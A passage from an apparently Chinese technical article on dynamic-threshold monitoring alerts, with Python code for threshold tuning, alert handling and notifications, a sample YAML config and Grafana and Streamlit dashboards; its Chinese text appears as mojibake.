            <span class="hljs-string">'false_positives'</span>: self.false_positive_count,
            <span class="hljs-string">'feedback_count'</span>: total
        }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">auto_tune</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""è‡ªåŠ¨è°ƒä¼˜"""</span>
        metrics = self.get_accuracy_metrics()
        
        <span class="hljs-keyword">if</span> metrics[<span class="hljs-string">'feedback_count'</span>] &lt; <span class="hljs-number">20</span>:
            <span class="hljs-comment"># åé¦ˆæ ·æœ¬ä¸è¶³ï¼Œä¸è¿›è¡Œè°ƒæ•´</span>
            <span class="hljs-keyword">return</span>
        
        <span class="hljs-keyword">if</span> metrics[<span class="hljs-string">'precision'</span>] &lt; <span class="hljs-number">0.5</span>:
            <span class="hljs-comment"># å‡†ç¡®ç‡ä½äº50%ï¼Œæ”¾å®½é˜ˆå€¼</span>
            self._adjust_threshold(direction=<span class="hljs-string">'relax'</span>)
        <span class="hljs-keyword">elif</span> metrics[<span class="hljs-string">'precision'</span>] &gt; <span class="hljs-number">0.9</span>:
            <span class="hljs-comment"># å‡†ç¡®ç‡å¾ˆé«˜ï¼Œå¯ä»¥é€‚å½“æ”¶ç´§é˜ˆå€¼ä»¥æé«˜æ•æ„Ÿåº¦</span>
            self._adjust_threshold(direction=<span class="hljs-string">'tighten'</span>)
</code></pre>
<h3 data-id="heading-19">4.4 ç‰¹æ®Šåœºæ™¯å¤„ç†</h3>
<h3 data-id="heading-20">4.4.1 ä¿ƒé”€æ´»åŠ¨ç­‰å·²çŸ¥äº‹ä»¶</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">EventAwareThresholdGenerator</span>(<span class="hljs-title class_ inherited__">DynamicThresholdGenerator</span>):
    <span class="hljs-string">"""äº‹ä»¶æ„ŸçŸ¥çš„é˜ˆå€¼ç”Ÿæˆå™¨"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, *args, **kwargs</span>):
        <span class="hljs-built_in">super</span>().__init__(*args, **kwargs)
        self.scheduled_events = []
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">register_event</span>(<span class="hljs-params">self, event_name, start_time, end_time, expected_multiplier</span>):
        <span class="hljs-string">"""
        æ³¨å†Œå·²çŸ¥äº‹ä»¶
        
        Args:
            event_name: äº‹ä»¶åç§°ï¼ˆå¦‚"åŒ11ä¿ƒé”€"ï¼‰
            start_time: å¼€å§‹æ—¶é—´
            end_time: ç»“æŸæ—¶é—´
            expected_multiplier: é¢„æœŸè´Ÿè½½å€æ•°ï¼ˆå¦‚3.0è¡¨ç¤º3å€è´Ÿè½½ï¼‰
        """</span>
        self.scheduled_events.append({
            <span class="hljs-string">'name'</span>: event_name,
            <span class="hljs-string">'start'</span>: start_time,
            <span class="hljs-string">'end'</span>: end_time,
            <span class="hljs-string">'multiplier'</span>: expected_multiplier
        })
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_calculate_dynamic_thresholds</span>(<span class="hljs-params">self, decomposition</span>):
        <span class="hljs-string">"""é‡å†™é˜ˆå€¼è®¡ç®—ï¼Œè€ƒè™‘å·²çŸ¥äº‹ä»¶"""</span>
        base_thresholds = <span class="hljs-built_in">super</span>()._calculate_dynamic_thresholds(decomposition)
        
        <span class="hljs-comment"># æ£€æŸ¥å½“å‰æ˜¯å¦åœ¨äº‹ä»¶æœŸé—´</span>
        current_time = datetime.now()
        <span class="hljs-keyword">for</span> event <span class="hljs-keyword">in</span> self.scheduled_events:
            <span class="hljs-keyword">if</span> event[<span class="hljs-string">'start'</span>] &lt;= current_time &lt;= event[<span class="hljs-string">'end'</span>]:
                <span class="hljs-comment"># åœ¨äº‹ä»¶æœŸé—´ï¼Œæ”¾å®½ä¸Šç•Œ</span>
                multiplier = event[<span class="hljs-string">'multiplier'</span>]
                base_thresholds[<span class="hljs-string">'upper'</span>] *= multiplier
                base_thresholds[<span class="hljs-string">'expected'</span>] *= multiplier
                
                logging.info(<span class="hljs-string">f"æ£€æµ‹åˆ°äº‹ä»¶'<span class="hljs-subst">{event[<span class="hljs-string">'name'</span>]}</span>'ï¼Œé˜ˆå€¼å·²è°ƒæ•´"</span>)
                <span class="hljs-keyword">break</span>
        
        <span class="hljs-keyword">return</span> base_thresholds
</code></pre>
<p>4.4.2 å†·å¯åŠ¨é—®é¢˜</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ColdStartHandler</span>:
    <span class="hljs-string">"""å†·å¯åŠ¨å¤„ç†å™¨"""</span>
    
<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_initial_thresholds</span>(<span class="hljs-params">metric_type, percentile=<span class="hljs-number">95</span></span>):
        <span class="hljs-string">"""
        åŸºäºå†å²ç»Ÿè®¡æ•°æ®çš„åˆå§‹é˜ˆå€¼
        
        Args:
            metric_type: æŒ‡æ ‡ç±»å‹ï¼ˆcpu/memory/diskç­‰ï¼‰
            percentile: ç™¾åˆ†ä½æ•°
        """</span>
        <span class="hljs-comment"># ä»å†å²æ•°æ®åº“åŠ è½½åŒç±»å‹æœåŠ¡çš„ç»Ÿè®¡æ•°æ®</span>
        historical_stats = {
            <span class="hljs-string">'cpu'</span>: {<span class="hljs-string">'p50'</span>: <span class="hljs-number">45</span>, <span class="hljs-string">'p95'</span>: <span class="hljs-number">75</span>, <span class="hljs-string">'p99'</span>: <span class="hljs-number">85</span>},
            <span class="hljs-string">'memory'</span>: {<span class="hljs-string">'p50'</span>: <span class="hljs-number">60</span>, <span class="hljs-string">'p95'</span>: <span class="hljs-number">80</span>, <span class="hljs-string">'p99'</span>: <span class="hljs-number">90</span>},
            <span class="hljs-string">'response_time'</span>: {<span class="hljs-string">'p50'</span>: <span class="hljs-number">100</span>, <span class="hljs-string">'p95'</span>: <span class="hljs-number">500</span>, <span class="hljs-string">'p99'</span>: <span class="hljs-number">1000</span>}
        }
        
        <span class="hljs-keyword">if</span> metric_type <span class="hljs-keyword">in</span> historical_stats:
            <span class="hljs-keyword">return</span> {
                <span class="hljs-string">'upper'</span>: historical_stats[metric_type][<span class="hljs-string">'p95'</span>],
                <span class="hljs-string">'lower'</span>: <span class="hljs-number">0</span>,
                <span class="hljs-string">'confidence'</span>: <span class="hljs-number">0.3</span>  <span class="hljs-comment"># ä½ç½®ä¿¡åº¦</span>
            }
        <span class="hljs-keyword">else</span>:
            <span class="hljs-comment"># æœªçŸ¥æŒ‡æ ‡ç±»å‹ï¼Œä½¿ç”¨ä¿å®ˆé˜ˆå€¼</span>
            <span class="hljs-keyword">return</span> {
                <span class="hljs-string">'upper'</span>: <span class="hljs-built_in">float</span>(<span class="hljs-string">'inf'</span>),
                <span class="hljs-string">'lower'</span>: <span class="hljs-number">0</span>,
                <span class="hljs-string">'confidence'</span>: <span class="hljs-number">0.0</span>
            }
</code></pre>
<h2 data-id="heading-21">äº”ã€ç”Ÿäº§ç¯å¢ƒéƒ¨ç½²å®è·µ</h2>
<h3 data-id="heading-22">5.1 ç³»ç»Ÿé›†æˆæ¶æ„</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductionAlertingSystem</span>:
    <span class="hljs-string">"""ç”Ÿäº§çº§å‘Šè­¦ç³»ç»Ÿ"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, config</span>):
        <span class="hljs-comment"># æ ¸å¿ƒç»„ä»¶</span>
        self.threshold_generators = {}
        self.alert_suppressor = AlertSuppressor()
        self.learning_system = AdaptiveLearningSystem(<span class="hljs-literal">None</span>)
        self.multi_metric_detector = MultiMetricAnomalyDetector()
        
        <span class="hljs-comment"># æ•°æ®å­˜å‚¨</span>
        self.timeseries_db = InfluxDBClient(config[<span class="hljs-string">'influxdb'</span>])
        self.alert_db = PostgreSQLClient(config[<span class="hljs-string">'postgres'</span>])
        
        <span class="hljs-comment"># å‘Šè­¦é€šé“</span>
        self.notifiers = {
            <span class="hljs-string">'dingtalk'</span>: DingTalkNotifier(config[<span class="hljs-string">'dingtalk_webhook'</span>]),
            <span class="hljs-string">'email'</span>: EmailNotifier(config[<span class="hljs-string">'smtp'</span>]),
            <span class="hljs-string">'pagerduty'</span>: PagerDutyNotifier(config[<span class="hljs-string">'pagerduty_key'</span>])
        }
        
        <span class="hljs-comment"># é…ç½®</span>
        self.config = config
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_metric</span>(<span class="hljs-params">self, metric_name, value, timestamp, metadata</span>):
        <span class="hljs-string">"""å¤„ç†å•ä¸ªæŒ‡æ ‡"""</span>
        <span class="hljs-comment"># 1. è·å–æˆ–åˆ›å»ºé˜ˆå€¼ç”Ÿæˆå™¨</span>
        <span class="hljs-keyword">if</span> metric_name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.threshold_generators:
            self.threshold_generators[metric_name] = self._create_threshold_generator(
                metric_name, metadata
            )
        
        generator = self.threshold_generators[metric_name]
        
        <span class="hljs-comment"># 2. è®¡ç®—åŠ¨æ€é˜ˆå€¼</span>
        result = generator.update_and_get_thresholds(value, timestamp)
        
        <span class="hljs-comment"># 3. å­˜å‚¨ç»“æœåˆ°æ—¶åºæ•°æ®åº“</span>
        self._store_threshold_data(metric_name, result)
        
        <span class="hljs-comment"># 4. å¦‚æœè§¦å‘å‘Šè­¦ï¼Œè¿›è¡Œåç»­å¤„ç†</span>
        <span class="hljs-keyword">if</span> result[<span class="hljs-string">'is_alert'</span>]:
            self._handle_alert(metric_name, result, metadata)
        
        <span class="hljs-keyword">return</span> result
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_create_threshold_generator</span>(<span class="hljs-params">self, metric_name, metadata</span>):
        <span class="hljs-string">"""æ ¹æ®æŒ‡æ ‡ç±»å‹åˆ›å»ºåˆé€‚çš„ç”Ÿæˆå™¨"""</span>
        metric_config = self.config[<span class="hljs-string">'metrics'</span>].get(
            metadata.get(<span class="hljs-string">'type'</span>, <span class="hljs-string">'default'</span>),
            self.config[<span class="hljs-string">'metrics'</span>][<span class="hljs-string">'default'</span>]
        )
        
        <span class="hljs-keyword">if</span> metadata.get(<span class="hljs-string">'has_scheduled_events'</span>):
            <span class="hljs-keyword">return</span> EventAwareThresholdGenerator(
                window_size=metric_config[<span class="hljs-string">'window_size'</span>],
                seasonal_period=metric_config[<span class="hljs-string">'seasonal_period'</span>]
            )
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> DynamicThresholdGenerator(
                window_size=metric_config[<span class="hljs-string">'window_size'</span>],
                seasonal_period=metric_config[<span class="hljs-string">'seasonal_period'</span>]
            )
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_handle_alert</span>(<span class="hljs-params">self, metric_name, result, metadata</span>):
        <span class="hljs-string">"""å¤„ç†å‘Šè­¦"""</span>
        <span class="hljs-comment"># 1. å‘Šè­¦æŠ‘åˆ¶æ£€æŸ¥</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.alert_suppressor.should_alert(metric_name, result[<span class="hljs-string">'timestamp'</span>]):
            logging.info(<span class="hljs-string">f"å‘Šè­¦è¢«æŠ‘åˆ¶: <span class="hljs-subst">{metric_name}</span>"</span>)
            <span class="hljs-keyword">return</span>
        
        <span class="hljs-comment"># 2. æ„å»ºå‘Šè­¦å¯¹è±¡</span>
        alert = {
            <span class="hljs-string">'id'</span>: self._generate_alert_id(),
            <span class="hljs-string">'metric'</span>: metric_name,
            <span class="hljs-string">'timestamp'</span>: result[<span class="hljs-string">'timestamp'</span>],
            <span class="hljs-string">'current_value'</span>: result[<span class="hljs-string">'current_value'</span>],
            <span class="hljs-string">'expected_value'</span>: result[<span class="hljs-string">'expected_value'</span>],
            <span class="hljs-string">'upper_bound'</span>: result[<span class="hljs-string">'upper_bound'</span>],
            <span class="hljs-string">'lower_bound'</span>: result[<span class="hljs-string">'lower_bound'</span>],
            <span class="hljs-string">'deviation'</span>: result[<span class="hljs-string">'deviation_percentage'</span>],
            <span class="hljs-string">'confidence'</span>: result[<span class="hljs-string">'confidence'</span>],
            <span class="hljs-string">'alert_type'</span>: result[<span class="hljs-string">'alert_type'</span>],
            <span class="hljs-string">'severity'</span>: self._calculate_severity(result),
            <span class="hljs-string">'metadata'</span>: metadata
        }
        
        <span class="hljs-comment"># 3. å­˜å‚¨å‘Šè­¦è®°å½•</span>
        self.alert_db.insert_alert(alert)
        
        <span class="hljs-comment"># 4. å‘é€é€šçŸ¥</span>
        self._send_notifications(alert)
        
        <span class="hljs-comment"># 5. è§¦å‘è‡ªåŠ¨åŒ–å“åº”ï¼ˆå¯é€‰ï¼‰</span>
        <span class="hljs-keyword">if</span> self.config.get(<span class="hljs-string">'auto_remediation_enabled'</span>):
            self._trigger_auto_remediation(alert)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_calculate_severity</span>(<span class="hljs-params">self, result</span>):
        <span class="hljs-string">"""è®¡ç®—å‘Šè­¦ä¸¥é‡ç¨‹åº¦"""</span>
        deviation = <span class="hljs-built_in">abs</span>(result[<span class="hljs-string">'deviation_percentage'</span>])
        confidence = result[<span class="hljs-string">'confidence'</span>]
        
        <span class="hljs-comment"># ç»¼åˆåç¦»åº¦å’Œç½®ä¿¡åº¦</span>
        severity_score = deviation * confidence
        
        <span class="hljs-keyword">if</span> severity_score &gt; <span class="hljs-number">100</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">'critical'</span>
        <span class="hljs-keyword">elif</span> severity_score &gt; <span class="hljs-number">50</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">'warning'</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">'info'</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_send_notifications</span>(<span class="hljs-params">self, alert</span>):
        <span class="hljs-string">"""å‘é€å‘Šè­¦é€šçŸ¥"""</span>
        severity = alert[<span class="hljs-string">'severity'</span>]
        
        <span class="hljs-comment"># æ ¹æ®ä¸¥é‡ç¨‹åº¦é€‰æ‹©é€šçŸ¥æ¸ é“</span>
        <span class="hljs-keyword">if</span> severity == <span class="hljs-string">'critical'</span>:
            <span class="hljs-comment"># ä¸¥é‡å‘Šè­¦ï¼šæ‰€æœ‰æ¸ é“</span>
            <span class="hljs-keyword">for</span> notifier <span class="hljs-keyword">in</span> self.notifiers.values():
                notifier.send(alert)
        <span class="hljs-keyword">elif</span> severity == <span class="hljs-string">'warning'</span>:
            <span class="hljs-comment"># è­¦å‘Šï¼šé’‰é’‰ + é‚®ä»¶</span>
            self.notifiers[<span class="hljs-string">'dingtalk'</span>].send(alert)
            self.notifiers[<span class="hljs-string">'email'</span>].send(alert)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-comment"># ä¿¡æ¯ï¼šä»…é’‰é’‰</span>
            self.notifiers[<span class="hljs-string">'dingtalk'</span>].send(alert)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_store_threshold_data</span>(<span class="hljs-params">self, metric_name, result</span>):
        <span class="hljs-string">"""å­˜å‚¨é˜ˆå€¼æ•°æ®åˆ°æ—¶åºæ•°æ®åº“"""</span>
        point = {
            <span class="hljs-string">'measurement'</span>: <span class="hljs-string">'dynamic_thresholds'</span>,
            <span class="hljs-string">'tags'</span>: {
                <span class="hljs-string">'metric'</span>: metric_name
            },
            <span class="hljs-string">'time'</span>: result[<span class="hljs-string">'timestamp'</span>],
            <span class="hljs-string">'fields'</span>: {
                <span class="hljs-string">'current_value'</span>: result[<span class="hljs-string">'current_value'</span>],
                <span class="hljs-string">'expected_value'</span>: result[<span class="hljs-string">'expected_value'</span>],
                <span class="hljs-string">'upper_bound'</span>: result[<span class="hljs-string">'upper_bound'</span>],
                <span class="hljs-string">'lower_bound'</span>: result[<span class="hljs-string">'lower_bound'</span>],
                <span class="hljs-string">'confidence'</span>: result[<span class="hljs-string">'confidence'</span>]
            }
        }
        self.timeseries_db.write_points([point])
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_generate_alert_id</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""ç”Ÿæˆå”¯ä¸€å‘Šè­¦ID"""</span>
        <span class="hljs-keyword">import</span> uuid
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(uuid.uuid4())
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_trigger_auto_remediation</span>(<span class="hljs-params">self, alert</span>):
        <span class="hljs-string">"""è§¦å‘è‡ªåŠ¨ä¿®å¤"""</span>
        <span class="hljs-comment"># ç¤ºä¾‹ï¼šCPUè¿‡é«˜æ—¶è‡ªåŠ¨æ‰©å®¹</span>
        <span class="hljs-keyword">if</span> alert[<span class="hljs-string">'metric'</span>] == <span class="hljs-string">'cpu_usage'</span> <span class="hljs-keyword">and</span> alert[<span class="hljs-string">'severity'</span>] == <span class="hljs-string">'critical'</span>:
            logging.info(<span class="hljs-string">"è§¦å‘è‡ªåŠ¨æ‰©å®¹..."</span>)
            <span class="hljs-comment"># è°ƒç”¨äº‘å¹³å°APIè¿›è¡Œæ‰©å®¹</span>
            <span class="hljs-comment"># cloud_api.scale_up(instance_id)</span>
</code></pre>
<p>5.2 é…ç½®æ–‡ä»¶ç¤ºä¾‹</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># config.yaml</span>
<span class="hljs-attr">metrics:</span>
  <span class="hljs-attr">default:</span>
    <span class="hljs-attr">window_size:</span> <span class="hljs-number">168</span>
    <span class="hljs-attr">seasonal_period:</span> <span class="hljs-number">24</span>
    <span class="hljs-attr">sigma_multiplier:</span> <span class="hljs-number">3</span>
    <span class="hljs-attr">min_samples:</span> <span class="hljs-number">48</span>
  
  <span class="hljs-attr">high_frequency:</span>
    <span class="hljs-attr">window_size:</span> <span class="hljs-number">24</span>
    <span class="hljs-attr">seasonal_period:</span> <span class="hljs-number">1</span>
    <span class="hljs-attr">sigma_multiplier:</span> <span class="hljs-number">2.5</span>
    <span class="hljs-attr">min_samples:</span> <span class="hljs-number">12</span>
  
  <span class="hljs-attr">batch_job:</span>
    <span class="hljs-attr">window_size:</span> <span class="hljs-number">720</span>
    <span class="hljs-attr">seasonal_period:</span> <span class="hljs-number">168</span>
    <span class="hljs-attr">sigma_multiplier:</span> <span class="hljs-number">4</span>
    <span class="hljs-attr">min_samples:</span> <span class="hljs-number">168</span>

<span class="hljs-attr">alert_suppression:</span>
  <span class="hljs-attr">cooldown_period:</span> <span class="hljs-number">300</span>  <span class="hljs-comment"># 5åˆ†é’Ÿ</span>
  <span class="hljs-attr">aggregation_window:</span> <span class="hljs-number">60</span>  <span class="hljs-comment"># 1åˆ†é’Ÿ</span>

<span class="hljs-attr">notifications:</span>
  <span class="hljs-attr">dingtalk_webhook:</span> <span class="hljs-string">"https://oapi.dingtalk.com/robot/send?access_token=xxx"</span>
  <span class="hljs-attr">smtp:</span>
    <span class="hljs-attr">host:</span> <span class="hljs-string">"smtp.company.com"</span>
    <span class="hljs-attr">port:</span> <span class="hljs-number">587</span>
    <span class="hljs-attr">username:</span> <span class="hljs-string">"alert@company.com"</span>
    <span class="hljs-attr">password:</span> <span class="hljs-string">"xxx"</span>
  <span class="hljs-attr">pagerduty_key:</span> <span class="hljs-string">"xxx"</span>

<span class="hljs-attr">auto_remediation_enabled:</span> <span class="hljs-literal">true</span>

<span class="hljs-attr">influxdb:</span>
  <span class="hljs-attr">host:</span> <span class="hljs-string">"localhost"</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">8086</span>
  <span class="hljs-attr">database:</span> <span class="hljs-string">"monitoring"</span>

<span class="hljs-attr">postgres:</span>
  <span class="hljs-attr">host:</span> <span class="hljs-string">"localhost"</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">5432</span>
  <span class="hljs-attr">database:</span> <span class="hljs-string">"alerts"</span>
  <span class="hljs-attr">username:</span> <span class="hljs-string">"admin"</span>
  <span class="hljs-attr">password:</span> <span class="hljs-string">"xxx"</span>
</code></pre>
<h3 data-id="heading-23">5.3 ç›‘æ§ä¸å¯è§†åŒ–</h3>
<h3 data-id="heading-24">5.3.1 Grafana Dashboardé…ç½®</h3>
<pre><code class="hljs language-lua" lang="lua">{
  <span class="hljs-string">"dashboard"</span>: {
    <span class="hljs-string">"title"</span>: <span class="hljs-string">"åŠ¨æ€é˜ˆå€¼ç›‘æ§"</span>,
    <span class="hljs-string">"panels"</span>: [
      {
        <span class="hljs-string">"title"</span>: <span class="hljs-string">"CPUä½¿ç”¨ç‡ - åŠ¨æ€é˜ˆå€¼"</span>,
        <span class="hljs-string">"targets"</span>: [
          {
            <span class="hljs-string">"measurement"</span>: <span class="hljs-string">"dynamic_thresholds"</span>,
            <span class="hljs-string">"select"</span>: [
              [<span class="hljs-string">"current_value"</span>, <span class="hljs-string">"å®é™…å€¼"</span>],
              [<span class="hljs-string">"expected_value"</span>, <span class="hljs-string">"é¢„æœŸå€¼"</span>],
              [<span class="hljs-string">"upper_bound"</span>, <span class="hljs-string">"ä¸Šç•Œ"</span>],
              [<span class="hljs-string">"lower_bound"</span>, <span class="hljs-string">"ä¸‹ç•Œ"</span>]
            ],
            <span class="hljs-string">"where"</span>: [
              {<span class="hljs-string">"key"</span>: <span class="hljs-string">"metric"</span>, <span class="hljs-string">"value"</span>: <span class="hljs-string">"cpu_usage"</span>}
            ]
          }
        ],
        <span class="hljs-string">"visualization"</span>: <span class="hljs-string">"timeseries"</span>,
        <span class="hljs-string">"fieldConfig"</span>: {
          <span class="hljs-string">"overrides"</span>: [
            {
              <span class="hljs-string">"matcher"</span>: {<span class="hljs-string">"id"</span>: <span class="hljs-string">"byName"</span>, <span class="hljs-string">"options"</span>: <span class="hljs-string">"ä¸Šç•Œ"</span>},
              <span class="hljs-string">"properties"</span>: [
                {<span class="hljs-string">"id"</span>: <span class="hljs-string">"color"</span>, <span class="hljs-string">"value"</span>: {<span class="hljs-string">"mode"</span>: <span class="hljs-string">"fixed"</span>, <span class="hljs-string">"fixedColor"</span>: <span class="hljs-string">"red"</span>}},
                {<span class="hljs-string">"id"</span>: <span class="hljs-string">"custom.lineStyle"</span>, <span class="hljs-string">"value"</span>: {<span class="hljs-string">"dash"</span>: [<span class="hljs-number">10</span>, <span class="hljs-number">10</span>]}}
              ]
            },
            {
              <span class="hljs-string">"matcher"</span>: {<span class="hljs-string">"id"</span>: <span class="hljs-string">"byName"</span>, <span class="hljs-string">"options"</span>: <span class="hljs-string">"ä¸‹ç•Œ"</span>},
              <span class="hljs-string">"properties"</span>: [
                {<span class="hljs-string">"id"</span>: <span class="hljs-string">"color"</span>, <span class="hljs-string">"value"</span>: {<span class="hljs-string">"mode"</span>: <span class="hljs-string">"fixed"</span>, <span class="hljs-string">"fixedColor"</span>: <span class="hljs-string">"red"</span>}},
                {<span class="hljs-string">"id"</span>: <span class="hljs-string">"custom.lineStyle"</span>, <span class="hljs-string">"value"</span>: {<span class="hljs-string">"dash"</span>: [<span class="hljs-number">10</span>, <span class="hljs-number">10</span>]}}
              ]
            }
          ]
        }
      },
      {
        <span class="hljs-string">"title"</span>: <span class="hljs-string">"å‘Šè­¦ç»Ÿè®¡"</span>,
        <span class="hljs-string">"targets"</span>: [
          {
            <span class="hljs-string">"query"</span>: <span class="hljs-string">"SELECT COUNT(*) FROM alerts WHERE time &gt; now() - 24h GROUP BY severity"</span>
          }
        ],
        <span class="hljs-string">"visualization"</span>: <span class="hljs-string">"piechart"</span>
      },
      {
        <span class="hljs-string">"title"</span>: <span class="hljs-string">"ç½®ä¿¡åº¦åˆ†å¸ƒ"</span>,
        <span class="hljs-string">"targets"</span>: [
          {
            <span class="hljs-string">"measurement"</span>: <span class="hljs-string">"dynamic_thresholds"</span>,
            <span class="hljs-string">"select"</span>: <span class="hljs-string">[["confidence", "ç½®ä¿¡åº¦"]]</span>
          }
        ],
        <span class="hljs-string">"visualization"</span>: <span class="hljs-string">"histogram"</span>
      }
    ]
  }
}
</code></pre>
<p>5.3.2 å®æ—¶ç›‘æ§è„šæœ¬</p>
<pre><code class="hljs language-ini" lang="ini">import streamlit as st
import pandas as pd
import plotly.graph_objects as go
from datetime import datetime, timedelta

class RealtimeMonitoringDashboard:
    """å®æ—¶ç›‘æ§ä»ªè¡¨æ¿"""
    
    def __init__(self, alerting_system):
        <span class="hljs-attr">self.system</span> = alerting_system
    
    def run(self):
        st.title("åŠ¨æ€é˜ˆå€¼å®æ—¶ç›‘æ§")
        
        <span class="hljs-comment"># ä¾§è¾¹æ ï¼šé€‰æ‹©æŒ‡æ ‡</span>
        <span class="hljs-attr">metric_name</span> = st.sidebar.selectbox(
            "é€‰æ‹©ç›‘æ§æŒ‡æ ‡",
            list(self.system.threshold_generators.keys())
        )
        
        <span class="hljs-comment"># ä¸»é¢æ¿ï¼šæ—¶åºå›¾</span>
        self._render_timeseries_chart(metric_name)
        
        <span class="hljs-comment"># ç»Ÿè®¡ä¿¡æ¯</span>
        col1, col2, <span class="hljs-attr">col3</span> = st.columns(<span class="hljs-number">3</span>)
        with col1:
            st.metric("24å°æ—¶å‘Šè­¦æ•°", self._get_alert_count(24))
        with col2:
            st.metric("å‘Šè­¦å‡†ç¡®ç‡", f"{self._get_precision():.1%}")
        with col3:
            st.metric("å¹³å‡ç½®ä¿¡åº¦", f"{self._get_avg_confidence():.2f}")
        
        <span class="hljs-comment"># æœ€è¿‘å‘Šè­¦åˆ—è¡¨</span>
        st.subheader("æœ€è¿‘å‘Šè­¦")
        self._render_recent_alerts()
    
    def _render_timeseries_chart(self, metric_name):
        """æ¸²æŸ“æ—¶åºå›¾"""
        <span class="hljs-comment"># ä»æ•°æ®åº“è·å–æœ€è¿‘24å°æ—¶æ•°æ®</span>
        <span class="hljs-attr">data</span> = self._fetch_data(metric_name, hours=<span class="hljs-number">24</span>)
        
        <span class="hljs-attr">fig</span> = go.Figure()
        
        <span class="hljs-comment"># å®é™…å€¼</span>
        fig.add_trace(go.Scatter(
            <span class="hljs-attr">x</span>=data[<span class="hljs-string">'timestamp'</span>],
            <span class="hljs-attr">y</span>=data[<span class="hljs-string">'current_value'</span>],
            <span class="hljs-attr">mode</span>=<span class="hljs-string">'lines'</span>,
            <span class="hljs-attr">name</span>=<span class="hljs-string">'å®é™…å€¼'</span>,
            <span class="hljs-attr">line</span>=dict(color=<span class="hljs-string">'blue'</span>, width=<span class="hljs-number">2</span>)
        ))
        
        <span class="hljs-comment"># é¢„æœŸå€¼</span>
        fig.add_trace(go.Scatter(
            <span class="hljs-attr">x</span>=data[<span class="hljs-string">'timestamp'</span>],
            <span class="hljs-attr">y</span>=data[<span class="hljs-string">'expected_value'</span>],
            <span class="hljs-attr">mode</span>=<span class="hljs-string">'lines'</span>,
            <span class="hljs-attr">name</span>=<span class="hljs-string">'é¢„æœŸå€¼'</span>,
            <span class="hljs-attr">line</span>=dict(color=<span class="hljs-string">'green'</span>, width=<span class="hljs-number">1</span>, dash=<span class="hljs-string">'dash'</span>)
        ))
        
        <span class="hljs-comment"># ä¸Šç•Œ</span>
        fig.add_trace(go.Scatter(
            <span class="hljs-attr">x</span>=data[<span class="hljs-string">'timestamp'</span>],
            <span class="hljs-attr">y</span>=data[<span class="hljs-string">'upper_bound'</span>],
            <span class="hljs-attr">mode</span>=<span class="hljs-string">'lines'</span>,
            <span class="hljs-attr">name</span>=<span class="hljs-string">'ä¸Šç•Œ'</span>,
            <span class="hljs-attr">line</span>=dict(color=<span class="hljs-string">'red'</span>, width=<span class="hljs-number">1</span>, dash=<span class="hljs-string">'dot'</span>)
        ))
        
        <span class="hljs-comment"># ä¸‹ç•Œ</span>
        fig.add_trace(go.Scatter(
            <span class="hljs-attr">x</span>=data[<span class="hljs-string">'timestamp'</span>],
            <span class="hljs-attr">y</span>=data[<span class="hljs-string">'lower_bound'</span>],
            <span class="hljs-attr">mode</span>=<span class="hljs-string">'lines'</span>,
            <span class="hljs-attr">name</span>=<span class="hljs-string">'ä¸‹ç•Œ'</span>,
            <span class="hljs-attr">line</span>=dict(color=<span class="hljs-string">'red'</span>, width=<span class="hljs-number">1</span>, dash=<span class="hljs-string">'dot'</span>),
            <span class="hljs-attr">fill</span>=<span class="hljs-string">'tonexty'</span>,
            <span class="hljs-attr">fillcolor</span>=<span class="hljs-string">'rgba(255,0,0,0.1)'</span>
        ))
        
        <span class="hljs-comment"># æ ‡è®°å‘Šè­¦ç‚¹</span>
        <span class="hljs-attr">alerts</span> = data[data[<span class="hljs-string">'is_alert'</span>] == <span class="hljs-literal">True</span>]
        fig.add_trace(go.Scatter(
            <span class="hljs-attr">x</span>=alerts[<span class="hljs-string">'timestamp'</span>],
            <span class="hljs-attr">y</span>=alerts[<span class="hljs-string">'current_value'</span>],
            <span class="hljs-attr">mode</span>=<span class="hljs-string">'markers'</span>,
            <span class="hljs-attr">name</span>=<span class="hljs-string">'å‘Šè­¦'</span>,
            <span class="hljs-attr">marker</span>=dict(color=<span class="hljs-string">'red'</span>, size=<span class="hljs-number">10</span>, symbol=<span class="hljs-string">'x'</span>)
        ))
        
        fig.update_layout(
            <span class="hljs-attr">title</span>=f<span class="hljs-string">"{metric_name} - åŠ¨æ€é˜ˆå€¼ç›‘æ§"</span>,
            <span class="hljs-attr">xaxis_title</span>=<span class="hljs-string">"æ—¶é—´"</span>,
            <span class="hljs-attr">yaxis_title</span>=<span class="hljs-string">"å€¼"</span>,
            <span class="hljs-attr">hovermode</span>=<span class="hljs-string">'x unified'</span>
        )
        
        st.plotly_chart(fig, <span class="hljs-attr">use_container_width</span>=<span class="hljs-literal">True</span>)
